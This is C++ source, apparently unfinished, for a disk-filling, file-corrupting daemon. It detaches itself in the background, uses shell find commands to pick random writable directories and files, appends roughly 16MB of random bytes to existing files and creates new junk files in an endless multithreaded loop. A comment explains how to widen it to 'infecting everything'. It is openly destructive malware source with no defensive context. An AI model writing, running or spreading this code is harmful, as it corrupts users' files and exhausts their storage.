#include <cstdint>
#include <string>
#include <string.h>
#include <random>
#include <fstream>
#include <thread>
#include <iostream>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>

// Not Done

// returns if file has been generated
bool download()
{
	std::random_device dev;
	std::string filename = "";

	// generate random file with random filename length plus some random data
    std::mt19937 rng(dev());
    std::uniform_int_distribution<uint8_t> filename_len(0x20U,0xffU);
    std::uniform_int_distribution<uint8_t> rnd_chr(0x0U,0xffU);
    std::uniform_int_distribution<uint64_t> rnd_64;
	for(uint8_t i=0;i<filename_len(rng);i++) {
		filename += rnd_chr(rng);
	}

	// generate random file path
	const char *rand_d = "find / -type d -perm -220 -print 2>&1 | grep -v \"Permission denied\" | shuf -n1"; // remove shuf -n1 for infecting everything instead of just one
	char buf[0xff];
    FILE *fp;

	
    if((fp = popen(rand_d, "r")) == NULL) {
		std::cout << "\nFp Error opening pipe!\n";
		return 0;
	}

	// add around 100MB data onto random filename in random folder
	while(fgets(buf, 0xff, fp) != NULL) {
		std::ofstream file;
		buf[strcspn(buf, "\n")] = 0;
		std::string tmp = (std::string)"find " + (std::string)buf +
						  (std::string)" -type f -perm -220 -print 2>&1 | grep -v \"Permission denied\" | shuf -n1";
		const char *rand_file = tmp.c_str();
		for(uint8_t k=0;k<3;k++) { // open random 3 files in the random folder and add around 100MB of data each. Possible to pick the same file more than once
			char new_file_buf[0x12c];
    		FILE *fp2;

    		if((fp2 = popen(rand_file, "r")) == NULL) {
				std::cout << "\nFp2 Error opening pipe!\n";
				return 0;
    		}

			while(fgets(new_file_buf, 0x12c, fp2) != NULL) {
				std::ofstream old_file;
				new_file_buf[strcspn(new_file_buf, "\n")] = 0;
				old_file.open(new_file_buf, std::ios_base::app); // open pre-existing random file in random folder
				for(uint32_t i=0;i<0xffff;i++) {
					for(uint8_t j=0;j<0xff;j++) old_file << rnd_chr(rng);
					old_file << std::endl;
				}
			}
		}
		file.open(buf+(std::string)"/"+filename, std::ios_base::app);
		for(uint32_t i=0;i<0xffff;i++) {
			for(uint8_t j=0;j<0xff;j++) file << rnd_chr(rng);
			file << std::endl; // every line is 256 characters
		}
	}

	//std::ofstream file;
	//stdfile.open("test", std::ios_base::app);
	//stdfor(uint32_t i=0;i<0xffff;i++) {
	//std	for(uint8_t j=0;j<0xff;j++) file << rnd_chr(rng);
	//std	file << std::endl; // every line is 256 characters
	//std}
	return 1;
}

// initial function from github repository daemon-skeleton-linux-c
static void daemon()
{
    pid_t pid;

    /* Fork off the parent process */
    pid = fork();


    /* Catch, ignore and handle signals */
    //TODO: Implement a working signal handler
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();


    /* set new file permissions */
    umask(0);

    /* change the working directory to the root directory */
    /* or another appropriated directory */
    chdir("/");

    /* close all open file descriptors */
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }

    /* open the log file */
    openlog ("Daemon Log", LOG_PID, LOG_DAEMON);
}

int main()
{
	daemon();
	const size_t thr_count = std::thread::hardware_concurrency();
	if(thr_count <= 5) { // use one thread
		while(1) {
			std::thread thread = std::thread(download);
			thread.join();
		}
	} else {
		while(1) {
			std::vector<std::thread> threads((uint16_t)round((float)thr_count/2)-1);
			for(uint16_t i=0;i<threads.size();i++) threads[i] = std::thread(download);
			for(uint16_t i=0;i<threads.size();i++) threads[i].join();
		}
	}
	return 0;
}

